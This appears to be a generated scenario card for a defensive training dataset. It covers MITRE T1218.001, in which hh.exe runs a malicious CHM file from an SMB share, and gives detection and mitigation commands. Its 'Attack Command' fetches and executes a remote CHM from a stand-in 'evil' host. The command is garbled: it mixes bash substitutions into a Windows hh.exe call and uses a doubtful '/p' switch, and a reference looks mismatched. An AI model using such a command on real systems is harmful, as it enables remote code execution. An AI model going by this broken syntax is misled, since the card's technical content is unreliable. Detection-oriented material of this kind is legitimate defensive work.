---
type: campaign
scenario_id: 235
tactic: Defense Evasion
technique: "T1218.001: Compiled HTML File"
technique_id: T1218.001
tags: [campaign, lotl, defense_evasion]
---

# Using hh.exe to execute malicious CHM via SMB share.

## Threat Description
Using hh.exe to execute malicious CHM via SMB share.

## Attack Command
```
hh \\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).chm) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor hh SMB: `wmic process where name='hh.exe' get commandline | findstr \\`; YARA rule: `rule HhSmbChm { strings: $a = /hh.*\\/ nocase; condition: $a }`.

## Mitigation
Restrict hh: `icacls %windir%\hh.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.

## AI Training Prompt
Train AI to detect hh SMB CHM execution and suggest SMB restrictions.

## References
- MITRE ATT&CK T1218.001: https://attack.mitre.org/techniques/T1218/001/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
